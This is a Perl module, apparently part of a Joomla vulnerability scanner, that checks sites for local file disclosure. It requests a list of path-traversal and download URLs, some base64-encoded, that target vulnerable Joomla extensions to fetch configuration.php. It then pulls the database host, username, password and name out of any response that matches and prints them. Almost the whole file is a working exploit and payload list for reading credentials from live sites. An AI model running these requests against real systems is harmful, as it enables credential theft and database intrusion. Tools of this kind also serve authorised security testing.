#start com_lfd module Checker
@lfds = ('index.php?option=com_joomanager&controller=details&task=download&path=configuration.php','plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=','components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php','index.php?option=com_macgallery&view=download&albumid=../../configuration.php','index.php?option=com_cckjseblod&task=download&file=configuration.php','plugins/content/fsave/download.php?filename=configuration.php','components/com_portfolio/includes/phpthumb/phpThumb.php?w=800&src=configuration.php','index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php','plugins/system/captcha/playcode.php?lng=configuration.php','index.php?option=com_rsfiles&task=download&path=../../configuration.php&Itemid=137','index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php','administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes','index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php','index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php','plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php','components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==','modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==','components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php','index.php?option=com_jetext&task=download&file=../../configuration.php','index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1','plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php','index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0','index.php?option=com_download-monitor&file=configuration.php');
foreach $lfd(@lfds){
	$source=$ua->get("$target/$lfd")->decoded_content;
	if ($source =~ /\$ftp_pass/g or $source =~ /\$error_reporting/g or $source =~ /\/usr\/sbin\/sendmail/g   or  $source =~ /JConfig/g or $source =~ m/\$dbtype/i || $source =~ m/force_ssl/i || $source =~ m/mosConfig_secret/i || $source =~ m/mosConfig_dbprefix/i ) {
		dprint("Checking for LFD vulnerability in modules");
		$source =~ /host = (.*?)\;/;
		my $hostname = $1;
		$source =~ /user = (.*?)\;/;
		my $dbuser = $1;
		$source =~ /password = (.*?)\;/;
		my $dbpass = $1;
		$source =~ /\$db = (.*?)\;/;
		my $dbdb = $1;

		my $conftmp="";
		$conftmp="hostname: $hostname\ndbuser: $dbuser\ndbpass: $dbpass\ndbname: $dbdb" if(length($hostname)>4);
		$conftmp  =~ s/\'//g;

		tprint("Local File Disclosure found\nPoC: $target/$lfd\n$conftmp");
	}
}
#end com_lfd module Checker 